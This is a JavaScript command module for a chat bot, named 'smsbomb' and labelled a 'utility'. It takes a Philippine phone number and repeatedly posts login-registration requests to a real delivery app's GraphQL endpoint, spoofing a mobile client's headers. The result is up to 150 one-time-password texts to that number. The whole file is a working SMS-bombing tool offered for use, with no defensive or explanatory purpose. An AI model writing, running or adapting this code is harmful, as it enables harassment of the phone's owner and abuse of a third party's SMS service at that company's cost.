const axios = require('axios');

module.exports["config"] = {
    name: "smsbomb",
    aliases: ["smsspam", "spamsms", "smsb"],
    isPrefix: false,
    version: "1.2.0",
    credits: "Kenneth Panio",
    role: 0,
    type: "utility",
    info: "Loop sending random OTP requests to a specified PH number, up to a limit of 150 requests.",
    usage: "[number] [times]",
    guide: "smsbomb 09123456789 5",
    cd: 10,
};

module.exports["run"] = async ({ chat, args, font, global }) => {
    const mono = (txt) => font.monospace(txt);

    if (args.length < 1) {
        return chat.reply(mono("❗ Usage: smsbomb [number] [times]"));
    }

    let number = args[0];
    const times = parseInt(args[1]) || 150;

    if (isNaN(times) || times < 1 || times > 150) {
        return chat.reply(mono("❗ Invalid number of times. It must be a positive integer, up to 150."));
    }

    if (number.startsWith("+63")) {
        number = number.slice(3);
    } else if (number.startsWith("63")) {
        number = number.slice(2);
    } else if (number.startsWith("0")) {
        number = number.slice(1);
    }

    if (!/^\d{10}$/.test(number)) {
        return chat.reply(mono("❗ Invalid PH phone number. Must be 10-12 digits starting with 09."));
    }

    const formatNumber = (num) => `+63${num}`;

    const sendOtp = async (formattedNumber) => {
        const url = "https://graphql.toktok.ph:2096/auth/graphql/";
        const headers = {
            'accept': '*/*',
            'authorization': '',
            'Content-Type': 'application/json',
            'Host': 'graphql.toktok.ph:2096',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/4.9.1'
        };
        const body = {
            "operationName": "loginRegister",
            "variables": {
                "input": {
                    "mobile": formattedNumber,
                    "appFlavor": "C"
                }
            },
            "query": "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"
        };

        try {
            const response = await axios.post(url, body, { headers });
            return response.data.data.loginRegister === "REGISTER";
        } catch (error) {
            console.error('Error sending OTP:', error.message);
            return false;
        }
    };

    const sending = await chat.reply(mono("📨 Start BOMBING SMS..."));

    let successCount = 0;
    let failCount = 0;

    try {
        for (let i = 0; i < times; i++) {
            const result = await sendOtp(formatNumber(number));
            if (result) {
                successCount++;
            } else {
                failCount++;
            }
        }

        await chat.reply(mono(`✅ SMS BOMB complete! Sent: ${successCount} success, ${failCount} failed.`));
    } catch (error) {
        return sending.edit(mono("❌ ERROR: " + error.message));
    }
};
